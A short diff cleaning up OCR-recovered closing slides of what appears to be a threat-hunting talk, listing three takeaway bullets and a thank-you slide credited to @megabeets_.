-hunting from nothing turning attacker’s opsec against them don’t just stick to one tool
-
-
-> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-% hunting from nothing
-X& turning attacker’s opsec
-A against them
-X don’t just stick to one tool
-```
+- hunting from nothing
+- turning attacker’s opsec against them
+- don’t just stick to one tool
 
 ## Slide 54
 
-**@** megabeets_
-
 THANK YOU
+
+@megabeets_
+
